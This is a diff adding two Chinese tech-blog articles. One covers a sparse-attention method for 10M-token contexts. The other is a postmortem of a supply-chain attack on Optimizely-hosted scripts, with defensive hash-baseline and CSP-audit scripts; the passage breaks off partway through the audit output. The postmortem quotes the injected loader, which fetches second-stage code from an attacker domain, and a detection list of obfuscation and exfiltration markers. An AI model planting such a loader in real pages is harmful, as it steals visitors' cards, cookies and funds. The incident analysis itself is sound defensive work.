@@ -48,7 +48,420 @@ def category_label(slug, lang):
     return slug
 
 
-ARTICLES = [{
+ARTICLES = [
+{
+    'slug': 'latent-sparse-attention-10m-context-2026',
+    'category': 'ai',
+    'date': '2026-11-17',
+    'updated': '2026-11-17',
+    'tags': ['稀疏注意力', '长上下文', 'SGLang', '推理优化'],
+    'title': '稀疏注意力 LSA：1000 万 token 下 prefill 快 22.7 倍，98% 的时间其实花在索引器上 | DevTools 博客',
+    'description': 'Prefrontal AI 与 ETH Zurich 的 Latent Sparse Attention（arXiv:2610.42147）把 key 在隐空间做层次聚类，query 只和桶中心打分，索引器从 O(T²) 降到 O(T log T)。10M token 下单层 prefill 比 GLM-5.3-Flash 原生稀疏注意力快 22.7 倍、比 Qwen3.8-27B 全注意力快 72.4 倍，端到端首 token 延迟 2.2 倍 / 9.2 倍。本文给出用三个数据点反解索引器占比的脚本（得出交叉点约 24 万 token），以及在 SGLang 里真正跑起来的三条命令与三个必踩的坑。',
+    'keywords': 'Latent Sparse Attention, LSA 稀疏注意力, 稀疏注意力 原理, 千万 token 上下文, 1000万 token prefill, subquadratic attention, 索引器 indexer, 如何降低首 token 延迟, 如何降低 TTFT, SGLang 部署 教程, 长上下文 显存 计算, D-LSA 蒸馏, N-LSA 原生训练, PaperTrail 基准, RULER 长上下文 评测, Agent 长程任务 成本, 超长上下文 落地, 10M context window',
+    'h1': '1000 万 token 的瓶颈不在注意力：98% 的时间花在「找」',
+    'summary': 'GLM-5.3-Flash 的一个全局注意力层，1000 万 token prefill 里有 98% 的时间不在算注意力，而在决定该看哪些 token。Latent Sparse Attention 把 key 在隐空间层次聚类，让 query 去和桶中心打分，索引器从二次方降到 O(T log T)。附一段脚本，用论文的三个占比点反解出索引器与注意力等价的上下文长度只有约 24 万 token。',
+    'body': '''
+<p>GLM-5.3-Flash 的一个全局注意力层，单张 H200，喂 1000 万 token 做 prefill：98% 的时间不在算注意力，在决定「该看哪些 token」。</p>
+
+<p>这个数字出自 Prefrontal AI 与苏黎世联邦理工（Torsten Hoefler 那组）10 月 30 日挂上 arXiv 的论文《Latent Sparse Attention: Towards Subquadratic Ultra-Long Context Attention》（arXiv:2610.42147，v2 于 11 月 3 日修订），代码 Apache-2.0 开源，机器之心 11 月 17 日的报道把它带进中文圈。我不打算复述摘要。只想讲清一件事：长上下文这条线上，「让注意力少看一点」已经基本做完了，剩下的活是「怎么更快找到该看的那一小部分」——而这一项，至今还挂着二次方。</p>
+
+<h2>一、二次方只是换了个位置</h2>
+
+<p>全注意力的账很直白：prefill 阶段每个 query 都要和之前所有 key 算相关性，长度 T 时是 O(T²)。上下文从 100 万涨到 1000 万，注意力这部分计算量涨 100 倍。</p>
+
+<p>稀疏注意力把活拆成两段——先由轻量索引器给每个 query 挑 k 个最相关的 key，真正的注意力只在这 k 个上算，注意力本体降到 O(Tk)。前半段已经被证明成立。论文附录做了个很干净的验证：128k token 下让 Qwen3.8-27B 的每个 query 只看真正最相关的 512 个 key，约占全部 key 的 0.8%，RULER 上仍保留全注意力 98% 的精度。</p>
+
+<p>卡在后半段。索引器要知道哪 512 个 key 最相关，就得先给每一个 key 打分。DeepSeek 的 DSA、MiniMax 的稀疏注意力、GLM 和 Qwen 的块稀疏方案，都在给索引器减负：降精度、降维度、四个 key 压成一个。这些手段把常数项除掉了几倍，但索引器的工作量仍随 T 线性增长，整体 prefill 依然是二次方。</p>
+
+<p>换个大白话的比方：从一座藏书千万册的图书馆里借 4096 本书，借书本身很快，麻烦是为了确定借哪 4096 本，你得把每一本书的书脊都看一遍。书越多，看书脊占的时间越多。</p>
+
+<p>论文算过一笔账：10M token 下，如果索引器开销能归零，稀疏注意力的 prefill 还能再快 58 倍。也就是说现在这套架构里，绝大部分算力花在了「找书」而不是「读书」。</p>
+
+<h2>二、把索引器从 O(T²) 拉到 O(T log T)</h2>
+
+<p>LSA 的做法是不逐个检查 key，改去检查 key 的分组。分不分不是重点，怎么分才是。</p>
+
+<p>现有块稀疏方案大多按位置分组，把相邻几个 key 打成一个块——等于图书馆按入库时间装箱，每箱贴一张摘要，一箱里只要有一本关键书，就可能被其余无关书目的摘要淹掉。LSA 改成按内容分组：key 先投影到一个学出来的低维隐空间（D-LSA 里是 64 维），在这个空间里用 Ward 层次聚类把语义相近的 key 归成一个桶，每个桶只保留一个中心向量，外加一张记录桶内 key 位置的索引表。查询时 query 只和桶中心打分，选出最相关的若干桶，再展开成具体 key，凑满 k 个送进注意力。</p>
+
+<p>Flat 版本带来的还是常数级收益。真正动复杂度的是 Tree 版本：桶之上再聚成节点桶，层层向上长成一棵树，query 从树顶往下走，每层只保留得分最高的几个分支（束搜索）。每个 query 只需检查 O(log T) 个中心向量，索引器的 prefill 从二次方降到 O(T log T)。论文标题里那个「次二次方」指的是这件事。</p>
+
+<p>这思路不新。Reformer 的 LSH 分桶、Routing Transformer 的聚类路由，都试过按内容组织 key。区别在于之前很少有人同时把精度和速度验证到 1M 以上——早期工作的分桶质量撑不住超长上下文，桶一多相似度就打散了。</p>
+
+<h2>三、嫁接，还是从头长</h2>
+
+<p>LSA 给了两条落地路径，一条给现成模型，一条给新模型。</p>
+
+<p><strong>D-LSA</strong>：冻结原模型全部参数，每层只加两个小投影矩阵，把 key 和 query 投到 64 维索引空间，再用蒸馏让 LSA 的打分去逼近原模型注意力的分布。整轮蒸馏只用了 3.52 亿 token。参照物是 DeepSeek DSA——光索引器的稠密预热阶段就烧了 21 亿 token。差 6 倍，这是 D-LSA 最实用的一点：改造一个 27B 模型，不需要重训底座。</p>
+
+<p>还有一个完全免训练的版本，直接拿 key 的主成分方向当投影，Qwen3.8-27B 上精度与训练版接近。想先试水，从这里开始最省事。</p>
+
+<p><strong>N-LSA</strong>：预训练时就原生用 LSA，只靠标准下一 token 预测损失，直接对注意力自己的 key 做聚类，没有额外投影、没有教师模型、没有辅助损失，参数量一个不增。团队训了一个 0.5B 的混合模型（24 层，每 4 层有 1 层全局注意力，其余是 Gated DeltaNet），128k 上下文退火。验证损失 1.085，与全注意力完全持平；同等稀疏预算下 NSA 是 1.117、PISA 1.100、滑动窗口 1.154。128k RULER 上 N-LSA 拿 32.2，全注意力 34.7，NSA 掉到 19.2，PISA 只剩 14.6。单层前向加反向比 FlashAttention-3 快 1.6 倍。</p>
+
+<p>这组数字值得多看一眼：稀疏注意力在 RULER 上掉分，一直是「省算力换精度」这条路的隐性成本。N-LSA 在验证损失上和全注意力打平，说明它的稀疏预算没有浪费在错的 key 上。</p>
+
+<h2>四、单层 22.7 倍，到端到端只剩 2.2 倍</h2>
+
+<p>10M token 下，D-LSA 单层 prefill 比 GLM-5.3-Flash 原生稀疏注意力快 22.7 倍，比 Qwen3.8-27B 的全注意力快 72.4 倍；decode 阶段分别是 4.6 倍和 42.5 倍。加速比随上下文增长而扩大，1M 时对 GLM 只有 3.5 倍，512k 时 2.1 倍。</p>
+
+<p>但单层不是模型。论文在 SGLang 里跑完整请求，10M token 下 GLM 的首 token 时间从约 7.5 分钟降到约 3.4 分钟（2.2 倍，开了上下文并行），Qwen3.8-27B 从约 76 分钟降到约 8 分钟（9.2 倍）。前者只有 2.2 倍，因为 GLM 本身已经是稀疏混合架构，非注意力层吃掉了大部分时间，LSA 动不了那些层。算 ROI 的时候必须按模型算，拿 22.7 倍去乘账单会算错。</p>
+
+<p>精度侧：MMLU-Pro、GPQA-Diamond、AIME25、MATH500、LongBench v2 上 D-LSA 全部落在基线的 95% 置信区间内，推理长度也没有明显变化。RULER 在 10M 上，Qwen 加 D-LSA 以 63.9 反超全注意力的 59.9；GLM 加 D-LSA 与原生稀疏差 4 分以内。要注意 GLM 的基线稀疏注意力是跟模型一起训练的，D-LSA 只是在冻结模型上蒸馏，这个比较对基线有利。</p>
+
+<p>真正让我停下来看的是 PaperTrail 这个新基准。它把虚构的研究线索埋进大量真实的 2026 年 arXiv 论文里：一篇虚构论文提出某个结果，若干真实论文被插进引用它的段落，几周后另一篇虚构论文修正数值并给方法改名，而部分后续论文仍在引用旧值——就跟真实的学术文献一样。模型要像写文献综述那样把这些事实找出来串起来。10M 规模的样本含 400 到 465 篇论文，Qwen 加 D-LSA 得 29.1，全注意力 19.8。</p>
+
+<p>它测的不是「大海捞针」而是「多篇文档互相矛盾时你信哪一篇」。Agent 做长程科研、写综述、翻历史决策记录，遇到的恰恰是后者。这类任务上全注意力的分数低得离谱（19.8），说明超长上下文并不等于超长理解——把上下文塞进窗口是一回事，模型能不能在窗口里建立正确的事实依赖是另一回事。</p>
+
+<table>
+<caption>10M token 下单个注意力层的索引开销（GLM-5.3-Flash，单张 H200）</caption>
+<thead><tr><th>方案</th><th>索引显存 / 层</th><th>单层 prefill 相对加速</th></tr></thead>
+<tbody>
+<tr><td>D-LSA（Tree）</td><td>246 MiB</td><td>22.7×</td></tr>
+<tr><td>GLM-5.3-Flash 原生稀疏</td><td>331 MiB</td><td>1×（基线）</td></tr>
+<tr><td>Qwen 风格块稀疏</td><td>642 MiB</td><td>更慢</td></tr>
+</tbody>
+</table>
+
+<h2>五、先算一遍，再决定要不要换部署栈</h2>
+
+<p>22.7 倍是别人的模型别人的卡。你该问的是自己的场景在哪个区间。论文图里能读出三个占比点（512k 时索引器占 67%，1M 时 79%，10M 时 98%），用这三个点可以反解出索引器与注意力两个系数之比，然后外推到任意长度：</p>
+
+<pre><code>def share(tokens, a_over_q):
+    # 索引器约 q*T^2，注意力约 a*T，所以占比 = 1 / (1 + a/(q*T))
+    return 1.0 / (1.0 + a_over_q / tokens)
+
+POINTS = [(512_000, 0.67), (1_000_000, 0.79), (10_000_000, 0.98)]
+ratios = [t * (1 - s) / s for t, s in POINTS]
+a_over_q = sum(ratios) / len(ratios)
+
+print("a/q 估计值（约等于索引器与注意力等价的上下文长度）:")
+for (t, s), r in zip(POINTS, ratios):
+    print(f"  {t:>10,} tokens  share={s:.2f}  -&gt;  a/q={r:,.0f}")
+print(f"  平均 a/q = {a_over_q:,.0f} tokens")
+print()
+print("按此模型外推的索引器时间占比:")
+for t in (131_072, 262_144, 524_288, 1_048_576, 4_194_304, 10_485_760):
+    s = share(t, a_over_q)
+    print(f"  {t:>10,} tokens  indexer={s*100:5.1f}%  若索引器免费则 prefill 快 {1/(1-s):4.1f}x")
+print()
+print(f"交叉点：{a_over_q:,.0f} tokens 处索引器占一半 prefill 时间")</code></pre>
+
+<p>跑出来是这样（Python 3.12，无第三方依赖）：</p>
+
+<pre><code>$ python indexer_share.py
+a/q 估计值（约等于索引器与注意力等价的上下文长度）:
+     512,000 tokens  share=0.67  -&gt;  a/q=252,179
+   1,000,000 tokens  share=0.79  -&gt;  a/q=265,823
+  10,000,000 tokens  share=0.98  -&gt;  a/q=204,082
+  平均 a/q = 240,695 tokens
+
+按此模型外推的索引器时间占比:
+     131,072 tokens  indexer= 35.3%  若索引器免费则 prefill 快  1.5x
+     262,144 tokens  indexer= 52.1%  若索引器免费则 prefill 快  2.1x
+     524,288 tokens  indexer= 68.5%  若索引器免费则 prefill 快  3.2x
+   1,048,576 tokens  indexer= 81.3%  若索引器免费则 prefill 快  5.4x
+   4,194,304 tokens  indexer= 94.6%  若索引器免费则 prefill 快 18.4x
+  10,485,760 tokens  indexer= 97.8%  若索引器免费则 prefill 快 44.6x
+
+交叉点：240,695 tokens 处索引器占一半 prefill 时间</code></pre>
+
+<p>交叉点在 24 万 token 附近。翻译成人话：如果你的 prompt 常在 128k 以内，索引器只占三成多的时间，换部署栈的收益有限；一旦常态超过 1M，索引器已经吃掉八成，这时候优化索引器是唯一还有意义的优化方向，优化注意力本体、优化算子融合、优化 batch 调度都是在剩下那两成里抠。</p>
+
+<p>顺带核对一个数字。论文说索引器归零后 10M 下 prefill 还能快 58 倍，按 98% 的占比反推应该是 50 倍（1/(1-0.98)）。差的这 8 倍来自索引器之外的固定开销——聚类、桶展开、位置表查表，这部分不随 T 消失。写成本模型时把两项分开，误差就不会失控。</p>
+
+<h2>六、在 SGLang 里真正跑起来</h2>
+
+<p>LSA 做成了 SGLang 插件，官方维护了一个 fork 的 serving 镜像。最小路径（单卡 H200，Qwen3.8-27B）：</p>
+
+<pre><code>docker pull ghcr.io/prefrontal-ai/sglang:lsa-v0.1.0
+
+gh release download d-lsa-weights-v1 -R Prefrontal-AI/latent-sparse-attention --dir ./maps --pattern 'qwen38_27b__long-16k-1M-heavy-key-and-query-d2048.pt'
+mv ./maps/qwen38_27b__long-16k-1M-heavy-key-and-query-d2048.pt ./maps/qwen38.pt
+
+docker run -it --rm --gpus all --shm-size 32g --network host -e HF_HOME=/hf -v $PWD:/ws:ro -v ./maps:/maps:ro -v $HF_HOME:/hf ghcr.io/prefrontal-ai/sglang:lsa-v0.1.0 bash
+
+pip install --no-deps /ws
+
+export LSA='{"lsa": {"projections": "/maps/qwen38.pt", "query_heads": "all"}}'
+python -m sglang.launch_server --model-path Qwen/Qwen3.8-27b --attention-backend fa3 --page-size 1 --disable-prefill-cuda-graph --json-model-override-args "$LSA"</code></pre>
+
+<p>三个坑，都是启动阶段就会撞上的：</p>
+
+<ul>
+<li><strong>--disable-prefill-cuda-graph 必须加。</strong> LSA 在 host 侧为 prefill 选 key，这段逻辑 CUDA graph 捕获不了，不加会在启动时直接崩。decode 阶段的 graph 仍然有效，所以关了 prefill 的不会连累 decode。</li>
+<li><strong>causal-conv1d 要 CUDA 12.x 的 nvcc。</strong> CUDA 13 编不过（GLM-5.3-Flash 的 delta-attention 层依赖它，缺了会退到更慢的 PyTorch kernel）。B300 是 sm_100，需要 12.8 以上。只做评测不想编译就加 --no-install-package causal-conv1d。</li>
+<li><strong>日志里没有 enabled 这一行，等于没生效。</strong> 插件通过 sglang.srt.plugins 的 entry point 注册，从 lsa 配置块自动启用，服务器启动日志会打印 enabled。看不到这行，请求还在走原模型的原生注意力，测出来的数字全是假的。而且这行出现在启动完成之前，要等 /health 通过再发请求。</li>
+</ul>
+
+<p>镜像默认按论文的 H200 配置拍平（flat 设计），B300 用 lsa-v0.1.0-b300 标签。想跑 GLM-5.3-Flash 需要 8 卡，配置模板在 configs/evaluation/accuracy/glm53_flash/ 下。</p>
+
+<p>过去两年大家在比谁能记住更多。接下来比的可能是谁能更快找到。索引器的复杂度，会变成长期跑着的 Agent 成本曲线上最陡的那一段——而这个位置，刚刚才有人证明可以挪一挪。</p>
+''',
+    'related': [("长上下文真正吃显存的地方：KV 缓存压缩的三种做法", "blog/kv-cache-compression-long-context-2026/"), ("从 1M 到 10M：另一个方向的账本，120B-A12B MoE 的显存开销", "blog/nemotron-3-super-2026/")],
+},
+{
+    'slug': 'optimizely-third-party-script-hijack-2026',
+    'category': 'security',
+    'date': '2026-11-17',
+    'updated': '2026-11-17',
+    'tags': ['供应链攻击', 'CSP', '第三方脚本', '前端安全'],
+    'title': 'Optimizely 供应链攻击复盘：178 家站点、188 个脚本，CSP 只有 15% 挡住了 | DevTools 博客',
+    'description': '2026-11-16 攻击者把恶意代码写进 Optimizely Web 客户的 Project JavaScript 字段，188 个脚本、178 家机构（Zoom、GitLab、BBC、HSBC、IKEA）在自家域名下向访客投放盗币与盗卡脚本，还带 Coruna/DarkSword 两套 iOS 漏洞链。Report URI 抽样 256 个受影响站点，只有 24 个（15%）真正拦住了载荷，原因是 strict-dynamic 与 unsafe-eval 正是标签管理器的刚需。本文给出两个可运行脚本：第三方脚本哈希基线巡检，与 CSP 放行面审计。',
+    'keywords': 'Optimizely 供应链攻击, 第三方脚本 投毒, CSP 配置 教程, strict-dynamic 风险, unsafe-eval, script-src 怎么配, 如何防止第三方脚本被篡改, 子资源完整性 SRI, 前端供应链安全, Magecart 原理, 脚本哈希 基线 巡检, Content-Security-Policy 实战, 网站被注入 恶意脚本 怎么查, 盗卡脚本 skimmer, Coruna iOS 漏洞, 第三方 JS 自查',
+    'h1': '178 家站点被投毒：只有 15% 的 CSP 挡住了那行脚本',
+    'summary': '11 月 16 日 04:21 UTC，BBC 页面加载的那个 Optimizely 脚本里多了一行。到晚上，188 个脚本、178 家机构在自己域名下给访客投毒：换掉加密钱包地址、偷卡号、偷 cookie 与截图，还给旧版 iOS 推漏洞链。Report URI 抽样 256 个受影响站点，只有 24 个的 CSP 真拦住了——因为拦住它的配置，恰好是标签管理器最不想要的配置。',
+    'body': '''
+<p>2026 年 11 月 16 日 04:21 UTC，BBC 页面从 cdn.optimizely.com 拉的那个脚本，比前一天的快照多了几行。域名没变，证书没变，页面里的 script 标签没变，连文件大小都只多了不到 300 字节。</p>
+
+<p>到当天 21:52 UTC，Scott Helme（Report URI 创始人）抓取了 1611 个 Optimizely 脚本，其中 188 个被改过，分属 178 家机构：BBC、CNN、Fox News、Zoom、GitLab、Salesforce、Smartsheet、Bitly、HSBC、IKEA、Equifax、Ledger、法航荷航、Peacock……Optimizely 自己的 www 与 login 站点也在名单里。真实数量大概更多，因为他的样本来自公开可抓的部分。Optimizely 在 17 日 01:02 UTC 于状态页确认了事件，措辞是「未经授权的第三方利用了 Web Experimentation 产品中的一个漏洞」。</p>
+
+<p>这件事值得写复盘，不是因为它大，而是因为它把「第三方脚本」这个被归给市场部门的风险，摊开在了工程团队面前：178 家机构没有一家改过自己的代码，没有一家发过版，没有一家收到预警，但它们的访客浏览器都在跑攻击者的代码。</p>
+
+<h2>一天之内发生了什么</h2>
+
+<table>
+<thead><tr><th>时间（UTC，11-16）</th><th>事件</th></tr></thead>
+<tbody>
+<tr><td>04:21</td><td>BBC 的 Optimizely 脚本首次被发现加载 webshell.lol</td></tr>
+<tr><td>05:23</td><td>注册 1688360.cc，签发证书</td></tr>
+<tr><td>08:28</td><td>1688360.cc/track.js 首次在 bbc.com 页面出现</td></tr>
+<tr><td>11:20</td><td>Zoom 的脚本被改（据其 Last-Modified 头）</td></tr>
+<tr><td>13:43</td><td>track.js 加入银行卡窃取模块</td></tr>
+<tr><td>17:13–17:57</td><td>加入第二台 iOS 主机，对 iOS 18.6 及更早版本注入漏洞 iframe</td></tr>
+<tr><td>19:24–19:59</td><td>扫描 1611 个脚本，186 个确认被感染</td></tr>
+<tr><td>20:40–21:52</td><td>大规模清理，188 个里只剩 1 个（TalkTalk）还在投毒</td></tr>
+<tr><td>11-17 00:37</td><td>1688360.cc 被置 clientHold，停止解析</td></tr>
+</tbody>
+</table>
+
+<p>载荷当天被重建了 26 次，每次只加功能、不删东西。这个频率本身就是一条信息：任何按周跑的脚本完整性检查，在这类攻击面前等于没有。</p>
+
+<h2>入口是 Project JavaScript 字段，不是 CDN</h2>
+
+<p>Optimizely Web 的交付方式决定了这次攻击的形状。每个客户从 CDN 加载一个脚本，形如 cdn.optimizely.com/js/6395285578973184.js。这个文件里除了 Optimizely 自己的运行时代码和实验配置，还有一个可选字段叫 projectJS——客户在后台写的、要在每个页面跑的定制 JS。</p>
+
+<p>攻击者改的是这个字段。脚本其余部分原样保留，文件仍由 cdn.optimizely.com 用 Optimizely 的证书、从各家站点原本就信任的主机上分发。所以这不是 CDN 缓存投毒，而是「在可信文件里改一段客户可写的配置」。</p>
+
+<p>注入到 Zoom 那个脚本里的代码，完整版长这样：</p>
+
+<pre><code>"projectJS": function(){(function(){try{var s=document.createElement('script');
+s.src='https://1688360.cc/track.js';s.async=true;
+(document.head||document.documentElement).appendChild(s);}catch(e){}})();</code></pre>
+
+<p>一行 loader，加载第二阶段。这个 loader 有三个变体：直接写 script 标签；把同一个 URL 做 base64 再用 atob() 解出来（所以全文搜 1688360.cc 搜不到，Smartsheet 的脚本被清理后就是以这个版本二次感染的）；以及把整份载荷内联进脚本，远端域名被墙时用 eval 兜底执行。</p>
+
+<p>还有一层容易漏：有些客户从自己的域名提供这个脚本（opt.scheels.com/js/id.js、www.vodafone.com.au/js/id.js 这类），因为内容来自同一个 Optimizely 项目，同样被感染。查 CDN 域名查不出这些。</p>
+
+<p>至于攻击者怎么拿到写入权限，报告里明确说不知道：可能是攻破 Optimizely 系统，可能是拿到了能跨客户操作的凭据。这一点很重要——它决定了这个洞是「供应商的洞」还是「你的洞」，而 178 家客户的答案取决于供应商，不取决于自己。</p>
+
+<h2>载荷干了什么</h2>
+
+<p>所有访客拿到的是同一份 track.js，模块同时激活，具体表现取决于设备和页面行为：</p>
+
+<ul>
+<li><strong>替换加密钱包地址。</strong> 匹配 BTC、ETH 与 EVM 链、TRON、SOL、TON、LTC、BCH、DOGE 地址，校验 checksum 后换成攻击者地址。替换面覆盖页面文本、表单字段、链接与图片、剪贴板（复制时和 navigator.clipboard）、出站 fetch/XHR、window.open、页面跳转、iOS 分享面板。</li>
+<li><strong>偷卡号。</strong> 13:43 加入的模块，监听表单提交与所有 POST，抓到卡号（过 Luhn 校验）、有效期、CVV 后经 navigator.sendBeacon 发到 1688360.cc/card.php。托管支付 iframe（Stripe、Adyen）里的卡不受影响，站点自有表单里的卡会中招。</li>
+<li><strong>偷 cookie 与截图。</strong> 在钱包/支付相关文字附近替换地址时，把页面 URL、document.cookie（没有 HttpOnly 的那些）、被替换的原始地址，以及 html2canvas 渲染的整页截图发到 1688360.cc/hit.php。</li>
+<li><strong>iOS 漏洞链。</strong> iPhone/iPad 上从两个 .icu 域名加载 boot.js，按系统版本挑链：13–17 走 Coruna，18.x 走 DarkSword，26 目前只做指纹识别。Coruna 加载器与 10 月另一起攻击中的样本字节完全一致。可见症状是 iOS 18.6 及更早的设备页面每 60 秒自动刷新一次，那是漏洞利用在重试。</li>
+</ul>
+
+<p>截至 16 日 19:25 UTC，攻击者钱包进账约 7040 美元（BTC 0.083、LTC 17.02、TRON 662.9 USDT 加 184 TRX、ETH 0.055、BSC 82 USDT）。TRON 钱包从 2026 年 3 月就活跃，说明这套基础设施在本次行动之前已经跑了很久。被偷的卡、cookie、iOS 权限都不上链，所以 7000 美元只是个下限，不是损失规模。</p>
+
+<h2>为什么你的扫描器一个都没响</h2>
+
+<p>因为从你站点的角度看，这次攻击根本不涉及你。</p>
+
+<p>代码扫描、SAST、SCA、WAF、部署监控，看的都是「你发布到服务器上的东西」。第三方脚本是访客浏览器直接从供应商服务器拉的，改它绕开了上述全部环节。你的发布流水线里没有任何一个环节会去比对 cdn.optimizely.com 上的文件内容——那个文件不在你的仓库里。</p>
+
+<p>第二层原因是信任被写进了配置。一个从 cdn.optimizely.com 加载脚本的站点，通常会在 CSP 里把这个主机加进 script-src，于是这个主机上的任何路径都被放行。攻击者不需要新域名，他也确实没用新域名。</p>
+
+<p>第三层是时间。载荷 26 次重建、13:43 才加盗卡模块，任何「每周比对一次脚本哈希」的机制，采样点落在干净版本上的概率都不低。</p>
+
+<h2>256 个站点的 CSP 实测：只有 24 个真挡住了</h2>
+
+<p>Report URI 对 256 个受影响站点做了 CSP 有效性抽样，结果比事件本身更值得记：</p>
+
+<table>
+<thead><tr><th>结果</th><th>站点数</th><th>说明</th></tr></thead>
+<tbody>
+<tr><td>完全没有 CSP</td><td>68</td><td>载荷直通</td></tr>
+<tr><td>CSP 放行了载荷，也放行了外发</td><td>50</td><td>最糟的一档：配置齐全但形同虚设</td></tr>
+<tr><td>载荷跑了，但 connect-src 拦住了外发</td><td>17</td><td>卡号偷不出去，但页面上的地址替换仍生效</td></tr>
+<tr><td>载荷被拦住</td><td>24（15%）</td><td>只有这一档算防住了</td></tr>
+</tbody>
+</table>
+
+<p>两个让载荷直通的配置，恰好是标签管理器生态的默认姿势：</p>
+
+<p><strong>'strict-dynamic'</strong>：信任一个被信任脚本插入的任何脚本。Optimizely 的 snippet 插入 track.js，track.js 就自动获得信任。这条指令本来是为了让 modern bundler 少维护白名单，代价是把「谁有权加载脚本」的决定权交给了白名单里的第一个脚本。</p>
+
+<p><strong>'unsafe-eval'</strong>：Optimizely 官方文档要求客户开启。它让内联兜底副本能跑。HSBC 是个典型：CSP 拦住了 track.js 的加载和外发，但内联的那份仍然执行了。</p>
+
+<p>只把 cdn.optimizely.com 写进白名单也没用——恶意代码本来就来自那个主机。真正起作用的是严格的 script-src（只列必要主机、不带 strict-dynamic、不带 unsafe-eval），加上收窄的 connect-src。这两条一起上，才落进那 24 个里。</p>
+
+<h2>实操一：给第三方脚本做哈希基线</h2>
+
+<p>知道「文件不在我仓库里」之后，能做的第一件事就是把它变成「在我仓库里」。给页面上每个跨域脚本记一份哈希基线，巡检时比对。下面这段只用标准库，两个子命令：snapshot 建基线，check 巡检（有变化返回 1，可以直接接 CI 或 cron）。</p>
+
+<pre><code>import hashlib, json, os, sys, urllib.request
+
+SMELL = [b"atob(", b"eval(", b"sendBeacon", b".icu/", b".cc/"]
+
+def script_srcs(html):
+    out = []
+    for chunk in html.split("script")[1:]:
+        tag = chunk.split("&gt;")[0]
+        if "src=" in tag:
+            raw = tag.split("src=")[1].strip()
+            out.append(raw.split()[0].strip('"').strip(chr(39)))
+    return out
+
+def fetch(src, base):
+    if src.startswith("http"):
+        with urllib.request.urlopen(src, timeout=20) as r:
+            return r.read()
+    with open(os.path.join(base, src.lstrip("/")), "rb") as f:
+        return f.read()
+
+def scan(html_path):
+    base = os.path.dirname(os.path.abspath(html_path))
+    html = open(html_path, encoding="utf-8", errors="replace").read()
+    result = {}
+    for src in script_srcs(html):
+        body = fetch(src, base)
+        result[src] = {
+            "sha256": hashlib.sha256(body).hexdigest(),
+            "bytes": len(body),
+            "smells": [s.decode() for s in SMELL if s in body],
+        }
+    return result
+
+if __name__ == "__main__":
+    cmd, html_path = sys.argv[1], sys.argv[2]
+    lock_path = sys.argv[sys.argv.index("--lock") + 1]
+    now = scan(html_path)
+    if cmd == "snapshot":
+        json.dump(now, open(lock_path, "w"), indent=2, sort_keys=True)
+        print(f"locked {len(now)} script(s) -&gt; {lock_path}")
+        sys.exit(0)
+    lock = json.load(open(lock_path))
+    counts = {"OK": 0, "CHANGED": 0, "NEW": 0, "GONE": 0}
+    print(f"{html_path}: {len(now)} script(s)")
+    for src, info in sorted(now.items()):
+        old = lock.get(src)
+        state = "NEW" if old is None else ("CHANGED" if old["sha256"] != info["sha256"] else "OK")
+        counts[state] += 1
+        tail = f"  flags: {', '.join(info['smells'])}" if info["smells"] else ""
+        print(f"  [{state:&lt;7}] {src}  {info['bytes']:,}B  {info['sha256'][:12]}{tail}")
+    for src in sorted(set(lock) - set(now)):
+        counts["GONE"] += 1
+        print(f"  [GONE   ] {src}")
+    print("summary: " + " ".join(f"{k.lower()}={v}" for k, v in counts.items()))
+    sys.exit(1 if counts["CHANGED"] + counts["NEW"] + counts["GONE"] else 0)</code></pre>
+
+<p>我用一份被投毒前后只差一行的 vendor 脚本做过样本，巡检输出是这样：</p>
+
+<pre><code>$ python script_lock.py snapshot index.html --lock scripts.lock.json
+locked 2 script(s) -> scripts.lock.json
+
+$ python script_lock.py check index.html --lock scripts.lock.json
+index.html: 2 script(s)
+  [OK     ] js/app.4f2a.js  80B  c51a7a5708ce
+  [CHANGED] js/opt.js  240B  7c84155c59a7  flags: .cc/
+summary: ok=1 changed=1 new=0 gone=0
+$ echo $?
+1</code></pre>
+
+<p>注意这里只报了 CHANGED 和一个 .cc/ 标记，没有报警文本。这正是这类工具该有的样子：它不判断善恶，只告诉你「这个字节序列昨天不是这样」。剩下的人工看一眼，五秒钟的事。巡检频率建议按分钟或按部署触发，不要按周——26 次重建的载荷，一周一次采样跟没跑一样。</p>
+
+<h2>实操二：算清你的 CSP 到底放行了什么</h2>
+
+<p>第二件事是审计自己现在的策略。下面这段读三条真实风格的 CSP，判断它们能不能挡住「可信主机上被改过的脚本」，结论只有 PAYLOAD RUNS 和 BLOCKED 两种——不要中间地带，因为攻击者也不给你中间地带。</p>
+
+<pre><code>ALLOW_ALL = {"*", "http:", "https:", "data:", "blob:"}
+
+def parse(policy):
+    out = {}
+    for part in policy.split(";"):
+        part = part.strip()
+        if not part:
+            continue
+        tok = part.split()
+        out[tok[0].lower()] = [t.strip("'").lower() for t in tok[1:]]
+    return out
+
+def audit(policy):
+    d = parse(policy) if policy else {}
+    script = d.get("script-src") or d.get("default-src") or []
+    connect = d.get("connect-src") or d.get("default-src") or []
+    findings = []
+    if not policy:
+        findings.append(("critical", "没有 CSP，任何来源的脚本都能跑"))
+    if "strict-dynamic" in script:
+        findings.append(("critical", "script-src 含 strict-dynamic：vendor 插入的新脚本会被信任"))
+    if "unsafe-eval" in script:
+        findings.append(("critical", "script-src 含 unsafe-eval：内联并 eval 的兜底副本照样执行"))
+    if "unsafe-inline" in script:
+        findings.append(("high", "script-src 含 unsafe-inline"))
+    if ALLOW_ALL &amp; set(script):
+        findings.append(("high", "script-src 用了通配来源"))
+    if not connect:
+        findings.append(("critical", "connect-src 未设置，数据可外发到任意域"))
+    elif ALLOW_ALL &amp; set(connect):
+        findings.append(("high", "connect-src 允许通配，外发不受限"))
+    vendor = [h.split("//")[-1] for h in script if "//" in h and "self" not in h]
+    if vendor and "strict-dynamic" not in script:
+        findings.append(("info", f"白名单主机是整域放行：{', '.join(vendor)}"))
+    return not findings or all(f[0] == "info" for f in findings), findings
+
+for name, policy in [
+    ("A 无 CSP", ""),
+    ("B 典型标签管理器配置",
+     "default-src 'self'; script-src 'self' 'unsafe-eval' 'strict-dynamic' "
+     "https://cdn.optimizely.com; connect-src 'self' https:;"),
+    ("C 严格 script-src + 收窄 connect-src",
+     "default-src 'self'; script-src 'self' https://cdn.optimizely.com; "
+     "connect-src 'self' https://api.example.com; object-src 'none';"),
+]:
+    blocked, found = audit(policy)
+    print(f"[{'BLOCKED' if blocked else 'PAYLOAD RUNS'}] {name}")
+    for level, msg in found:
+        print(f"    {level:&lt;8} {msg}")
+    print()</code></pre>
+
+<pre><code>[PAYLOAD RUNS] A 无 CSP
+    critical 没有 CSP，任何来源的脚本都能跑
+    critical connect-src 未设置，数据可外发到任意域
+
+[PAYLOAD RUNS] B 典型标签管理器配置
